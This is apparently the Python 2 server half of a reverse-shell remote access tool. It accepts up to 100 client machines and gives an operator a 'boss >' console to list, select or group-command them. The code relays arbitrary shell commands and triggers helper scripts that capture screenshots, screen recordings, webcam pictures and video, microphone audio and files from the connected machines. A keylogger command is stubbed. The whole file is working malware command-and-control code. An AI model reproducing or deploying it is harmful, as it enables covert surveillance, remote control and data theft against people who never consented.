import socket
import sys
import getpass
import os
import time
import pyaudio
import pygame.camera
import pygame.image
import wave
import cv2
import numpy
import subprocess
import pyscreenshot as ImageGrab
import re
from threading import Thread

BYTES = 20000

HOST = '0.0.0.0'
PORT= 44455

NUM_OF_CLIENTS=100
CURRENT_CLIENT = ''
CURRENT_CLIENT_ADDR=''
CURRENT_CLIENT_PORT=''

clients_con=[]
clients_addr=[]
clients_name=[]

if not os.path.isdir('temporary'):
  os.mkdir('temporary')

os.chdir('temporary')

def server_commands(cmd):
  cmd=cmd.replace('me_','')
  print "\t\t~~~~~~~~~SERVER~~~~~~~~~~~~"
  if 'cd' in cmd:
    if os.path.isdir(cmd[3:]):
      os.chdir(cmd[3:])
      output_str=str(os.getcwd())+"> "
    else:
      output_str="No such file or directory\n"+str(os.getcwd())+"> "
    print output_str,
  else:
    cmd=subprocess.Popen(cmd,shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
    output=cmd.stdout.read()+cmd.stderr.read()
    print output+"\n"+os.getcwd()+">> ",
  
def close_all():
  cmd='serverquit'
  for con in clients_con:
    con.send(str.encode(cmd))
    con.close()
  
def list_connection():
  global clients_name
  global clients_con
  global clients_addr
  global BYTES
  res=''
  D={}
  temp_clients_name=[]
  temp_clients_con=[]
  temp_clients_addr=[]
  
  for i in range(0,len(clients_addr)):
    if clients_addr[i][0] not in D.keys():
      D[clients_addr[i][0]]=1
      temp_clients_name.append(clients_name[i])
      temp_clients_con.append(clients_con[i])
      temp_clients_addr.append(clients_addr[i])
    else:
      clients_con[i].sendall('dieclient')
      
  clients_name=temp_clients_name
  clients_con=temp_clients_con
  clients_addr=temp_clients_addr
  res=''
  delvect=[]
  TIME=10
  
  print "===========Clients=============\n",
  for i in range(0,len(clients_addr)):
    try:
      clients_con[i].settimeout(TIME)
      clients_con[i].send(str.encode('$#$'))
      data=clients_con[i].recv(BYTES).encode("utf-8")
      print str(i)+") "+clients_name[i],
      SPACE=40
      X=len(str(i)+") "+clients_name[i])
      SPACE=SPACE-X
      VAL=" "*SPACE
      print VAL+"( "+clients_addr[i][0]+" )",
      #print 'hi'
      if clients_name[i]=='super_doodle':
      	print "WARNING : SUSPECTED AT 12:09 AM 26-01-2018 !!\n"
      else:
      	print "\n"
    except:
      print "Delete : "+clients_name[i]
      delvect.append(i)
  for i in range(0,len(delvect)):    
    del clients_con[delvect[i]]
    del clients_name[delvect[i]]
    del clients_addr[delvect[i]]
   
def get_target(cmd):
  global clients_name
  global clients_con
  global clients_addr
  global BYTES
  global CURRENT_CLIENT
  global CURRENT_CLIENT_ADDR
  global CURRENT_CLIENT_PORT
  try:
    target=cmd.replace('select ','')
    ind=int(target)
    if ind<len(clients_name):
      CURRENT_CLIENT = clients_name[ind]
      CURRENT_CLIENT_ADDR=clients_addr[ind][0]
      CURRENT_CLIENT_PORT=clients_addr[ind][1]
      return clients_con[ind] 
  except:
    print "Cannot Connect .."
    return None
    
def myterminal():
  ind=-1
  while True:
    try:
      cmd=raw_input("boss > ")
      if cmd=='quit':
        close_all()
        return
      elif cmd=='listusers':
        list_connection()
      elif 'select' in cmd:
        con=get_target(cmd)
        if con != None:      
          send_commands(con)
      elif 'group_send' in cmd:
        group_send(cmd)
      elif 'me_' in cmd:
        server_commands(cmd)
        print "\n"
      else:
        print "No Registered Command"
    except Exception,e:
      print "MYTERMINAL ERROR",e
      continue 

def recvall(con,cmd,sz):
  global BYTES
  part=''
  f=open(cmd,'wb')
  l=con.recv(BYTES)
  sub=0
  sz=int(sz)
  perc=float(0)
  counter=float(1)
  while (l):
    sub+=len(l)
    perc=float(sub)*100/sz
    if perc>=counter:
      #print perc,"%"
      sys.stdout.write("%f%%\r"%(perc))
      sys.stdout.flush()
      counter=counter+1
    f.write(l)
    if sub>=sz:
      break
    l=con.recv(BYTES)
  print '100%\n',
  f.close()  

def CurrentDirectory(con):
  global BYTES
  con.send("cwd")
  total=''
  d=con.recv(1)
  while(d!='\n'):
    total+=d
    d=con.recv(1)
  total=int(total)
  cwd=''
  while True:
    cwd+=con.recv(BYTES)
    if(len(cwd)>=total):
      break
  return cwd

def all_commands(con,cmd):
  global BYTES
  global CURRENT_CLIENT
  global CURRENT_CLIENT_PORT
  global CURRENT_CLIENT_ADDR
  global clients_con
  global MEMBER
  
  ind=clients_con.index(con)
  
  CURRENT_CLIENT = clients_name[ind]
  CURRENT_CLIENT += MEMBER
  CURRENT_CLIENT_ADDR=clients_addr[ind][0]
  CURRENT_CLIENT_PORT=clients_addr[ind][1] 
  
  #print "(",CURRENT_CLIENT_PORT,CURRENT_CLIENT_ADDR,")"
  if 'me_' in cmd:
    server_commands(cmd)
  elif cmd=='cwd':
    print CurrentDirectory(con),
  elif cmd=='dieclient':
    con.send(str.encode(cmd))
    con.close()
    ind=clients_con.index(con)      
    clients_con.remove(con)
    del clients_addr[ind]
    del clients_name[ind]
    return 1
  elif cmd=='quit':
    con.send(str.encode(cmd))
    con.close()
    ind=clients_con.index(con)      
    clients_con.remove(con)
    del clients_addr[ind]
    del clients_name[ind]
    return 1
  elif 'screenshot' in cmd:
    count=re.sub(r"screenshot *","",cmd)
    if len(count)==0:
      count=int('1')
    else:
      count=int(count)
    con.sendall('screenshot')
    subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/screenshot.py",str(count),HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print CurrentDirectory(con),
  elif 'utils_keystroke' in cmd:
    con.sendall('utils_keystroke')
    #subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/keystroke.py",HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print " TODO -- :D "
    print CurrentDirectory(con),
  elif 'screenrecord' in cmd:
    con.send(str.encode(cmd))
    subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/screenrecord.py",cmd,HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print CurrentDirectory(con),
  elif 'catsend' in cmd:
    con.send(str.encode(cmd))
    subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/catsend.py",cmd,HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print CurrentDirectory(con),
  elif 'catcopy' in cmd:
    con.send(str.encode(cmd))
    subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/catcopy.py",cmd,HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print CurrentDirectory(con),
  elif 'capturevideo' in cmd:
    con.send(str.encode(cmd))
    subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/video.py",HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print CurrentDirectory(con),
  elif 'capturepic' in cmd:
    cmd=re.sub(r"capturepic *","",cmd)
    print "CMD : ",cmd,len(cmd)
    if(len(cmd)==0):
      cmd = int('1')
    else:
      cmd=int(cmd)
    con.sendall('capturepic')
    subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/capturepic.py",str(cmd),HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print CurrentDirectory(con),
  elif 'microphone' in cmd:
    cmd=re.sub(r"microphone *","",cmd)
    BURST='10'
    if len(cmd)==0:
      cmd='1'
    else:
      vect=cmd.split(' ')
      for i in range(0,len(vect)):
        if vect[i][0]=='b':
          BURST=str(vect[i][1:])
        if vect[i][0]=='s':
          cmd=str(vect[i][1])
    if(cmd!='1' and cmd!='0'):
      cmd='1'
    con.send('microphone')
    subprocess.Popen(["xterm","-e","/home/abhay/Desktop/py/reverse-shell/helper/microphone.py",cmd,BURST,HOST,str(CURRENT_CLIENT_PORT),str(BYTES),CURRENT_CLIENT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print CurrentDirectory(con),
  elif 'speak' in cmd:
    con.send(cmd)
    print CurrentDirectory(con),
  else:  
    if len(str.encode(cmd))>0 :
      con.send(str.encode(cmd))
      sub=0
      resp = ''
      total = 0
      data = con.recv(1)
      while data!='\n':
        total = total*10+int(data)
        data = con.recv(1)
      total = int(total)
      while sub!=total:
        l=con.recv(BYTES)
        sub+=len(l)
        resp += l
      print resp,  
  return 0
   
def group_send(cmd):
  global MEMBER
  cmd=re.sub(r"group_send *","",cmd)
  if(len(cmd)==0):
    print "Specify Group Members Too !!"
    return
  vect=cmd.split(' ')
  if(len(vect)==1):
    print "Usage 'group_send group_members command' !!"
    return
    
  to_send=[]
  memb=vect[0]
  
  if memb=='*':
    to_send=range(0,len(clients_con))
  else:
    v1=memb.split(',')
    for i in range(0,len(v1)):
      chunk=v1[i]
      if(len(chunk)==3):
        for x in range(int(chunk[0]),int(chunk[2])+1):
          if(x<len(clients_con)):
            to_send.append(x)
      elif len(chunk)==1:
        if(int(chunk)<len(clients_con)):
          to_send.append(int(chunk))
  
  D={}
  temp=[]
  for i in range(0,len(to_send)):
    if to_send[i] not in D.keys():
      D[to_send[i]]=1
      temp.append(to_send[i])      
  to_send=temp    
  del vect[0]
  cmd=' '.join(vect)
  print "GROUP SEND TO : ",to_send,"COMMAND : ",cmd
  temp=[]
  for i in range(0,len(to_send)):
    temp.append([clients_con[to_send[i]],clients_name[to_send[i]],clients_addr[to_send[i]]])  
  to_send=temp  
  for i in range(0,len(to_send)):
    con=to_send[i][0]
    MEMBER = '_'+str(i+1)
    print "\n\n\t\tSENDING TO :",to_send[i][1],"\n"
    try:
      all_commands(to_send[i][0],cmd)
      print "\n"
    except:
      print "Send To Client : ",to_send[i][1]," failed !!"
      continue
          
def send_commands(con):
  global BYTES
  global CURRENT_CLIENT
  global MEMBER
  print CurrentDirectory(con),
  while True:
    try:
      cmd=raw_input()
      print "SEND : ",cmd
      MEMBER = ''
      status=all_commands(con,cmd)
      if status==1:
        return
    except Exception,e1:
      print e1,+"\n"+"Send Command Error ..Either connection closed by client or network error"
      con.close()
      ind=clients_con.index(con)      
      clients_con.remove(con)
      del clients_name[ind]
      del clients_addr[ind]
      return
      
def accept_con():
  global clients_con
  global clients_addr
  global clients_name
  global s
  global BYTES
  for c in clients_con:
    c.close()
  del clients_con[:]
  del clients_addr[:]
  del clients_name[:]  
  while True:
    conn, addr = s.accept()
    clients_con.append(conn)
    clients_addr.append(addr)
    conn.send(str.encode('username'))
    username=str(conn.recv(BYTES))
    clients_name.append(username)
    print "\nConnected to IP : "+addr[0]+" PORT : "+str(addr[1])+" USER : "+username
  
def socket_create():
  try:     
    global BYTES
    global HOST
    global PORT
    global s
    global NUM_OF_CLIENTS
    global clients_con
    global clients_addr
    global clients_name  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(NUM_OF_CLIENTS)
    t1=Thread(target=accept_con)
    t1.start()
    t1.dameon=True
    t2=Thread(target=myterminal)
    t2.start()
    t2.dameon=True
    t2.join()
    s.close()
    print "Exiting .."
    os.system("pkill -f server")
  except socket.error as msg:
    print "Socket Error : "+ str(msg)
    print "Retrying .."

def main():
  socket_create()
if __name__=='__main__':
  main()
